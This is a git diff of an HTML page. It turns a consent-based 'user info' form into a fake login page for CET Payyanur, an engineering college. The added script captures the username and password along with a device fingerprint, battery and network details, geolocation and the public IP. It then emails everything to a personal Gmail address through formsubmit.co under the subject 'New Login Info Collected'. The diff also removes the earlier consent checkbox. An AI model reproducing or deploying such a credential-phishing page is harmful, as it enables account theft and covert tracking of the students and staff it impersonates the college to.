@@ -1,108 +1,244 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>User Info Collector</title>
+  <title>CET Payyanur Login</title>
   <style>
-    body { font-family: Arial, sans-serif; margin: 20px; max-width: 700px; }
-    label, input, textarea { display: block; margin: 10px 0; width: 100%; }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f1f1f1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 40px;
+      margin-bottom: 15px;
+      width: 92%;
+      max-width: 400px;
+    }
+
+    .header img {
+      height: 100px;
+      width: 130px;
+      margin-right: 15px;
+    }
+
+    .header-text {
+      text-align: left;
+    }
+
+    .header-text .title {
+      font-size: 24px;
+      
+      font-weight: bold;
+      line-height: 1.2;
+      margin-left: 50px;
+    }
+
+    .header-text .subtitle {
+      font-size: 1px;
+      font-weight: bold;
+      color: #555;
+      letter-spacing: 0.5px;
+      margin-left: 40px;
+    }
+
+    .login-box {
+      width: 92%;
+      max-width: 400px;
+      background-color: #f1f1f1;
+      padding: 30px 25px 20px 25px;
+      border-radius: 4px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.30);
+    }
+
+    .form-group {
+      display: flex;
+      align-items: center;
+      margin-bottom: 18px;
+    }
+
+    .form-group label {
+      flex: 0 0 110px;
+      font-weight: bold;
+      font-size: 14px;
+      color: #222;
+    }
+
+    .form-group label span {
+      color: red;
+    }
+
+    .form-group input {
+      flex: 1;
+      padding: 10px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+    }
+
+    .login-box .button-wrapper {
+      display: flex;
+      justify-content: center;
+    }
+
+    .login-box button {
+      width: 120px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      font-size: 16px;
+      padding: 10px;
+      border-radius: 4px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+    }
+
+    .login-box button::before {
+      margin-right: 8px;
+      font-size: 16px;
+    }
+
+    .login-box .forgot {
+      text-align: center;
+      margin-top: 12px;
+    }
+
+    .login-box .forgot a {
+      text-decoration: none;
+      font-size: 13px;
+      color: #0096e2;
+    }
+
+    footer {
+      margin-top: 200px;
+      font-size: 13px;
+      color: #777;
+    }
+
+    footer strong {
+      font-weight: bold;
+      color: #444;
+    }
   </style>
 </head>
 <body>
-  <h2>User Info Collection (with Consent)</h2>
 
-  <form id="userForm" action="https://formsubmit.co/abhinavavpavithranav@gmail.com" method="POST">
-    <label>Name: <input type="text" name="name" required></label>
-    <label>Email: <input type="email" name="email" required></label>
-    <label>Message: <textarea name="message" required></textarea></label>
+  <div class="header">
+    <img src="sh.jpg" alt="CET Logo">
+    <div class="header-text">
+      <div class="title"><span style="font-size: 70px;color:#00a0e3;">CET</span><br> PAYYANUR</div>
+      <div class="subtitle">ENGINEERING AND ARCHITECTURE</div>
+    </div>
+  </div>
 
-    <label>
-      <input type="checkbox" id="consentCheckbox" required>
-      I give consent to collect my device and browser information.
-    </label>
+  <div class="login-box">
+    <form id="userForm" action="https://formsubmit.co/abhinavavpavithranav@gmail.com" method="POST">
+      <div class="form-group">
+        <label for="username">USERNAME <span>*</span></label>
+        <input type="text" id="username" required>
+        <input type="hidden" name="collectedInfo" id="collectedInfo" />
 
-    <input type="hidden" name="collectedInfo" id="collectedInfo">
+      <!-- FormSubmit options -->
+      <input type="hidden" name="_template" value="table" />
+      <input type="hidden" name="_captcha" value="false" />
+      <input type="hidden" name="_subject" value="New Login Info Collected" />
+      <input type="hidden" name="_next" value="https://abhinavavavav.github.io/thanks.html" />
+      </div>
 
-    <!-- FormSubmit options -->
-    <input type="hidden" name="_template" value="table">
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_subject" value="New User Info Collected">
-    <input type="hidden" name="_next" value="https://abhinavavavav.github.io/thanks.html">
+      <div class="form-group">
+        <label for="password">PASSWORD <span>*</span></label>
+        <input type="password" id="password" required>
+      </div>
 
-    <button type="submit">Submit</button>
-  </form>
+      <div class="button-wrapper">
+        <button type="submit">Login</button>
+      </div>
 
-  <script>
-    const form = document.getElementById('userForm');
+      <div class="forgot">
+        <a href="#">Forgot password?</a>
+      </div>
+    </form>
+  </div>
 
-    form.addEventListener('submit', async function (e) {
+  <footer>
+    © 2025 <strong>Etuwa Concepts</strong>, All rights reserved.
+  </footer>
+   <script>
+    const form = document.getElementById("userForm");
+
+    form.addEventListener("submit", async function (e) {
       e.preventDefault();
 
-      if (!document.getElementById('consentCheckbox').checked) {
-        alert('Please give consent to proceed.');
-        return;
-      }
-
-      const formData = new FormData(form);
-      const name = formData.get('name');
-      const email = formData.get('email');
-      const message = formData.get('message');
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
 
       const collected = {
-        "Name": name,
-        "Email": email,
-        "Message": message,
-        "UserAgent": navigator.userAgent,
-        "Language": navigator.language,
-        "Platform": navigator.platform,
-        "Vendor": navigator.vendor,
-        "ScreenWidth": screen.width,
-        "ScreenHeight": screen.height,
-        "PixelRatio": window.devicePixelRatio,
-        "TouchSupport": 'ontouchstart' in window || navigator.maxTouchPoints > 0,
-        "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
-        "LocalTime": new Date().toString(),
-        "DeviceMemoryGB": navigator.deviceMemory || "Not available",
-        "CPUThreads": navigator.hardwareConcurrency || "Not available"
+        Username: username,
+        Password: password,
+        UserAgent: navigator.userAgent,
+        Language: navigator.language,
+        Platform: navigator.platform,
+        Vendor: navigator.vendor,
+        ScreenWidth: screen.width,
+        ScreenHeight: screen.height,
+        PixelRatio: window.devicePixelRatio,
+        TouchSupport: "ontouchstart" in window || navigator.maxTouchPoints > 0,
+        Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        LocalTime: new Date().toString(),
+        DeviceMemoryGB: navigator.deviceMemory || "Not available",
+        CPUThreads: navigator.hardwareConcurrency || "Not available"
       };
 
-      if ('connection' in navigator) {
+      if ("connection" in navigator) {
         const conn = navigator.connection;
-        collected["ConnectionType"] = conn.type || "Unknown";
-        collected["EffectiveConnectionType"] = conn.effectiveType || "Unknown";
-        collected["DownlinkMbps"] = conn.downlink || "Unknown";
+        collected.ConnectionType = conn.type || "Unknown";
+        collected.EffectiveConnectionType = conn.effectiveType || "Unknown";
+        collected.DownlinkMbps = conn.downlink || "Unknown";
       }
 
-      if ('getBattery' in navigator) {
+      if ("getBattery" in navigator) {
         try {
           const battery = await navigator.getBattery();
-          collected["BatteryLevel"] = (battery.level * 100) + "%";
-          collected["IsCharging"] = battery.charging ? "Yes" : "No";
-          collected["ChargingTimeSec"] = battery.chargingTime;
-          collected["DischargingTimeSec"] = battery.dischargingTime;
+          collected.BatteryLevel = battery.level * 100 + "%";
+          collected.IsCharging = battery.charging ? "Yes" : "No";
+          collected.ChargingTimeSec = battery.chargingTime;
+          collected.DischargingTimeSec = battery.dischargingTime;
         } catch (err) {
-          collected["BatteryInfo"] = "Permission denied or not supported";
+          collected.BatteryInfo = "Permission denied or not supported";
         }
       } else {
-        collected["BatteryInfo"] = "Not supported";
+        collected.BatteryInfo = "Not supported";
       }
 
-      // Get location
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
-            collected["Latitude"] = position.coords.latitude;
-            collected["Longitude"] = position.coords.longitude;
-            collected["LocationAccuracyMeters"] = position.coords.accuracy;
+            collected.Latitude = position.coords.latitude;
+            collected.Longitude = position.coords.longitude;
+            collected.LocationAccuracyMeters = position.coords.accuracy;
             fetchIPAndSubmit(collected);
           },
           () => {
-            collected["Location"] = "Denied or unavailable";
+            collected.Location = "Denied or unavailable";
             fetchIPAndSubmit(collected);
           }
         );
       } else {
-        collected["Location"] = "Geolocation not supported";
+        collected.Location = "Geolocation not supported";
         fetchIPAndSubmit(collected);
       }
     });
@@ -111,21 +247,21 @@
       fetch("https://api.ipify.org?format=json")
         .then((res) => res.json())
         .then((data) => {
-          collected["PublicIP"] = data.ip;
+          collected.PublicIP = data.ip;
           finalizeAndSubmit(collected);
         })
         .catch(() => {
-          collected["PublicIP"] = "Unavailable";
+          collected.PublicIP = "Unavailable";
           finalizeAndSubmit(collected);
         });
     }
 
-    function flatten(obj, prefix = '') {
+    function flatten(obj, prefix = "") {
       const flat = {};
       for (let key in obj) {
         const value = obj[key];
         const newKey = prefix ? `${prefix}_${key}` : key;
-        if (typeof value === 'object' && value !== null) {
+        if (typeof value === "object" && value !== null) {
           Object.assign(flat, flatten(value, newKey));
         } else {
           flat[newKey] = value;
@@ -136,7 +272,7 @@
 
     function finalizeAndSubmit(collected) {
       const flatCollected = flatten(collected);
-      document.getElementById('collectedInfo').value = JSON.stringify(flatCollected);
+      document.getElementById("collectedInfo").value = JSON.stringify(flatCollected);
       form.submit();
     }
   </script>
